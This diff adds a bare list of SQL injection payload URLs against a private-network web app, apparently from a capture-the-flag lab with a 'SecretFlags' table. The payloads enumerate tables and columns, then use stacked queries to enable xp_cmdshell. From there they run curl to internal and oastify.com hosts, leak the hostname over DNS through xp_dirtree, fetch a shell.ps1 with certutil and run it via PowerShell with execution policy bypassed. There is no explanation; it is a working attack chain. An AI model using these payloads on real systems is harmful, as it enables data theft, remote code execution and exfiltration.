@@ -1,0 +1,44 @@
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,table_name,3,4%20FROM%20information_schema.tables--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,table_name,3,4%20FROM%20information_schema.tables%20where%20table_name%20not%20in%20('message')--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,table_name,3,4%20FROM%20information_schema.tables%20where%20table_name%20not%20in%20('message','SecretFlags')--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,table_name,3,4%20FROM%20information_schema.tables%20where%20table_name%20not%20in%20('message','SecretFlags','UserAgents')--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,table_name,3,4%20FROM%20information_schema.tables%20where%20table_name%20not%20in%20('message','SecretFlags','UserAgents','users')--+
+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,column_name,3,4%20FROM%20information_schema.columns--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,column_name,3,4%20FROM%20information_schema.columns where table_name in ('SecretFlags')--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,column_name,3,4%20FROM%20information_schema.columns where table_name in ('SecretFlags') and column_name not in ('Flag','ID')--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,column_name,3,4%20FROM%20information_schema.columns where table_name in ('SecretFlags') and column_name not in ('Flag','ID','Message')--+
+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,ID,3,4%20FROM%20SecretFlags--+
+
+http://192.168.100.47:3100/user/admin'%20and%201=0%20union%20select%201,Message,3,4%20FROM%20SecretFlags--+
+
+EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+
+http://192.168.100.47:3100/user/admin';%20EXEC%20sp_configure%20'show%20advanced%20options',1;RECONFIGURE;--+
+
+http://192.168.100.47:3100/user/admin';EXEC xp_cmdshell 'dir'--+
+
+http://192.168.100.47:3100/user/admin';EXEC%20xp_cmdshell%20'curl%20192.168.100.10:80'--+
+
+http://192.168.100.47:3100/user/admin';EXEC%20xp_cmdshell%20'curl%20r2ua0m27jezjxyjr9xnsaw2lgcm3atyi.oastify.com'--+
+
+http://192.168.100.47:3100/user/admin';DECLARE%20@data%20varchar(1024);SELECT%20@data=(select%20HOST_NAME());EXEC(%27master.dbo.xp_dirtree%20%22%5C%5C%27%2B%40data%2B%27.havslf033ottf56g7d26hgilnct3ht5i.oastify.com%2Ffoo%24%22%27)%3B--%20-
+
+
+http://192.168.100.47:3100/user/admin';EXEC%20xp_cmdshell%20%27certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.100.53%2Fshell.ps1%20C%3A%5C%5CUsers%5C%5CPublic%5C%5Cshell.ps1%27--+
+
+http://192.168.100.47:3100/user/admin';EXEC%20xp_cmdshell%20%27certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.100.53%2Fshell.ps1%20C%3A%5C%5CUsers%5C%5CPublic%5C%5Cshell.ps1%27--+
+
+
+http://192.168.100.47:3100/user/admin';EXEC%20xp_cmdshell%20%27powershell%20-ep%20bypass%20-c%20%22C%3A%5C%5CUsers%5C%5CPublic%5C%5Cshell.ps1%22%27--+
+
